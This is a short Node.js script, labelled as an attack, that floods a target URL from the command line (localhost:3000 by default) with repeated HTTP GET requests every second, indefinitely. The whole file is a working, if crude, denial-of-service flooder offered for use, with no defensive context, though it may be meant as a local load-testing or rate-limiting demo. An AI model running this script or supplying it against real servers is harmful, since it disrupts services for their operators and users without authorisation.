const http = require('http');

console.log('starting attack')

function getRequest(http, url) {
    http.get(url, (resp) => {
        console.log(`performing attack to ${attackURL}`)
        let data = '';

        // A chunk of data has been received.
        resp.on('data', (chunk) => {
            data += chunk;
        });

        // The whole response has been received. Print out the result.
        resp.on('end', () => {
            console.log('success');
        });

    }).on("error", (err) => {
        console.log("Error: " + err.message);
    });
}

const attackURL = process.argv[2].includes('http') ? process.argv[2] : 'http://localhost:3000';
const requestsNumber = Number(process.argv[3]) > 0 ? Number(process.argv[3]) : 10;

let seconds = 0
setInterval(() => {
    for (let i = 0; i < requestsNumber; i++) {
        getRequest(http, attackURL)
    }
    seconds++
    console.log('Seconds: ', seconds)

}, 1000);
console.log('end attack')